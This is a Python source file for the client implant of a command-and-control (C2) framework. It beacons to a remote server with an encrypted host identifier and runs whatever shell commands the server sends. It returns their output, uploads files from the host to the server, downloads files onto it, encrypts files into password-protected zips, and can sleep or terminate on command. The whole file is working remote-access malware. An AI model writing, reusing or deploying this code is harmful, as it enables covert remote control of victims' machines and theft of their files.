#!/bin/python3
"""
C2 Client side code
"""
from os import chdir, getenv, uname, getcwd, mkdir, path

import platform, socket, time
from subprocess import PIPE, STDOUT, run
from requests import exceptions, get, post, put
from crypt import cipher
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, \
                ZIP_PASSWORD, FILE_SEND, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode, C2Commands


timestamp = str(int(time.time()))
def post_to_server(msg, response_path=RESPONSE_PATH, response_key=RESPONSE_KEY):
    try:
        encrypt_msg = cipher.encrypt(msg.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={response_key: encrypt_msg}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException as e:
        return print(e + "\n")
    
def get_filename(input_string, replace=True):
    """This function that splits a str & return the 3rd item reformatted ;)"""
    try:
        return " ".join(input_string.split()[2:]).replace("\\", "/")
    except IndexError:
        post_to_server(f"You must enter a argument after {input_string}.\n")

# Check the operating system
if platform.system() == "Windows":
    # Windows environment
    client = getenv("USERNAME", "Unknown_User") + "@" + getenv("COMPUTERNAME", "Unknown_ComputerName") + "_" + timestamp
else:
    # Linux environment
    client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
encrypted_client = cipher.encrypt(client.encode()).decode() # encoder

# PROXY = {"https": "proxy.some-site.com:443"}
while True:
    try:
        response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}', headers=HEADER, proxies=PROXY)
        print(response)
        if response.status_code == HTTPStatusCode.NOT_FOUND.value:
            raise exceptions.RequestException
    except exceptions.RequestException as e:
        # print(e)
        time.sleep(3)
        continue

    cmd = cipher.decrypt(response.content).decode()

    if cmd.startswith(C2Commands.CD.value): # cd command
        dir = cmd[3:]
        try:
            chdir(dir)
        except FileNotFoundError:
            post_to_server(f"{dir} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{dir} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have the permissions to access {dir}.\n")
        except OSError:
            post_to_server(f"There was an OS error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE) # encode of getcwd needed

    elif not cmd.startswith(C2Commands.CLS.value): # client ...
        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
        post_to_server(cmd_output.stdout.decode())

    elif cmd.startswith(C2Commands.CLS_DWN.value): # client download
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
        try:
            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
                    if response.status_code == HTTPStatusCode.OK.value:
                        with open(filename, "wb") as file_handle:
                            # Decrypt the response content and write the file out to disk, then notify us on the server
                            file_handle.write(cipher.decrypt(response.content))
                        post_to_server(f"{filename} is now on {client}.\n")
        except (PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    elif cmd.startswith(C2Commands.CLS_UP.value): # client upload
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        encrypted_filename = cipher.encrypt(filename.encode()).decode()
        try:
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, headers=HEADER, proxies=PROXY)
        except (PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")
        
    elif cmd.startswith(C2Commands.CLS_ZIP.value): # client zip
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        try:
            if path.isdir(filepath):
                post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n")
            elif not path.isfile(filepath):
                raise OSError
            else:
                with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                    zip_file.setpassword(ZIP_PASSWORD)
                    zip_file.write(filepath, filename)
                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
        except OSError:
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    elif cmd.startswith(C2Commands.CLS_UZIP.value): # client unzip
        filepath = get_filename(cmd)
        if filepath is None: #IndexError / start new iteration
            continue
        filename = path.basename(filepath)
        try:
            with AESZipFile(filepath) as zip_file:
                zip_file.setpassword(ZIP_PASSWORD)
                zip_file.extractall(path.dirname(filename))
                post_to_server(f"{filepath} is now unzip and decrypted on the client.\n")
        except (PermissionError, OSError):
            post_to_server(f"{filepath} was not found on the client.\n")
    elif cmd.startswith(C2Commands.CLS_KLL.value): # client kill
        post_to_server(f"{client} has been killed.\n")
        exit()

    elif cmd.startswith(C2Commands.CLS_SLP.value): # client sleep
        try:
            delay = float(cmd.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must Enter in a positive nbr for time sleeping in sec.\n")
        else:
            # post_to_server(f"{client} will sleep for {delay} seconds.\n")
            time.sleep(delay)
            post_to_server(f"{client} is now awake.\n")

  
    print(response.status_code)
    #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")